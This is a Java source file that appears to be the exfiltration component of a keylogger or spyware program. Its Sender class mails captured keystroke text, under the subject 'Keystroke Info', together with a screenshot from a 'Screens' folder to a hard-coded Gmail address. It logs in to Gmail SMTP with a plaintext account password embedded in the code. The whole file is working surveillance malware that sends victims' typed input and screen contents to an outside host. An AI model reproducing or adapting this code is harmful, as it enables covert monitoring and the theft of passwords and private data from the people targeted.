package handlers;

import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message.RecipientType;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class Sender {
	
	private Sender() {
		
	}
	
	private static final String SENDER_GMAIL = "SpyMinuspol@gmail.com";
	private static final String SENDER_PASSWORD = "Elektronen69!";
	
	private static final String RECIEVERS_EMAIL = "SpyPluspol@gmail.com";
	
	private static Properties mailServerProperties;
	private static Session mailSession;
	private static MimeMessage mailMessage;
	
	public static void sendMail(String emailBody){
		
		
		try {
			mailServerProperties = System.getProperties();
			mailServerProperties.put("mail.smtp.port",  "587");
			mailServerProperties.put("mail.smtp.auth",  "true");
			mailServerProperties.put("mail.smtp.starttls.enable",  "true");
			
			mailSession = Session.getDefaultInstance(mailServerProperties);
			mailMessage = new MimeMessage(mailSession);
			mailMessage.addRecipient(RecipientType.BCC, new InternetAddress(RECIEVERS_EMAIL));
			mailMessage.setSubject("Keystroke Info");
			
			
			BodyPart messageBodyPart = new MimeBodyPart();

			messageBodyPart.setText(emailBody);
	         
			Multipart multipart = new MimeMultipart();
			multipart.addBodyPart(messageBodyPart);
			
			messageBodyPart = new MimeBodyPart();
	         String filename = "Screens/" + AdditionalFunctionsIDOntBotherToCreateTheirOwnClasses.Filename + ".jpg";
	         DataSource source = new FileDataSource(filename);
	         messageBodyPart.setDataHandler(new DataHandler(source));
	         messageBodyPart.setFileName(filename);
	         multipart.addBodyPart(messageBodyPart);
	         
			mailMessage.setContent(multipart, "text/html");
			
			Transport transport = mailSession.getTransport("smtp");
			transport.connect("smtp.gmail.com", SENDER_GMAIL, SENDER_PASSWORD);
			transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
			transport.close();
		} catch (AddressException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchProviderException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (MessagingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	};
	
	
}